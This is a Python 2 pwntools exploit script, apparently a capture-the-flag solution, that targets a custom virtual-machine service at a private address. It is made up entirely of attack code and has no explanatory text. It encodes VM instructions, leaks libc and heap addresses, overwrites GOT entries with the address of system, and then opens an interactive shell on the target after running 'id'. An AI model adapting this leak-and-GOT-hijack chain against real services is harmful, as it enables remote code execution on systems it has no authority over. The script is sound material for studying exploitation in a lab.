#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "10.211.55.6"
port = 8888


def dump_reg():
    value = (0 << 28)
    value |= (3 << 26)
    value |= 0xf0000
    return "0" + hex(value)[2:].ljust(7,'0')

def xchg_reg(reg1,reg2):
    value = (5 << 28)
    value |= (0 << 26)
    value |= (reg1 << 23)
    value |= (reg2 << 20)
    value |= 0xf0000
    return hex(value)[2:].ljust(8,'0')

def set_reg(reg,val):
    value = (1 << 28)
    value |= (1 << 26)
    value |= (reg << 23)
    value |= 0xf0000
    value |= val
    return hex(value)[2:].ljust(8,'0')

def write_mem(reg):
    value = (8 << 28)
    value |= (2 << 26)
    value |= (reg << 23)
    value |= 0xf0000
    return hex(value)[2:].ljust(8,'0')

def pop(reg):
    value = (9 << 28)
    value |= (2 << 26)
    value |= (reg << 23)
    value |= 0xf0000
    return hex(value)[2:].ljust(8,'0')

def back():
    value = (0xa << 28)
    value |= (3 << 26)
    value |= 0xf0000
    return hex(value)[2:].ljust(8,'0')
    
r = remote(host,port)

r.sendline(set_reg(0,0x44d0)*0x20 + xchg_reg(0,7) + dump_reg() )
r.recvuntil("0x44e0")
data = r.recvuntil("\n")
data =  data.split()
libc = ""
for i in range(8) :
    libc += chr(int(data[i],16))
libc = u64(libc) - 0x3c3b78
r.sendline(set_reg(0,0x4310) + xchg_reg(0,7) + dump_reg())
r.recvuntil("0x4310")
print hex(libc)
data = r.recvuntil("\n")
data =  data.split()
heap = ""
for i in range(8) :
    heap += chr(int(data[i],16))
heap = u64(heap)
print hex(heap)
stack_end = heap + 0x30
char_got = 0x60c0a0
endl_got = 0x60c0f0
offset = (char_got - stack_end + 0x100000000) + 8
r.sendline(set_reg(0,0x4012+2) + xchg_reg(0,7) + set_reg(1,offset >> 16) +write_mem(1) )
r.sendline(set_reg(0,0x4010+2) + xchg_reg(0,7) +   set_reg(1,offset & 0xffff) + write_mem(1) + xchg_reg(4,7) )
get = libc + 0xfee50
system = libc + 0x45390
magic = system
payload = ""
for i in range(3,-1,-1):
    payload += set_reg(1, (get >> 16*i) & 0xffff) + write_mem(1)
payload += pop(4)*((endl_got-0x60c0a8)/2 + 8)
for i in range(3,-1,-1):
    payload += set_reg(1,(magic >> 16*i) & 0xffff) + write_mem(1)

r.sendline(payload)
r.sendline("id")
r.interactive()
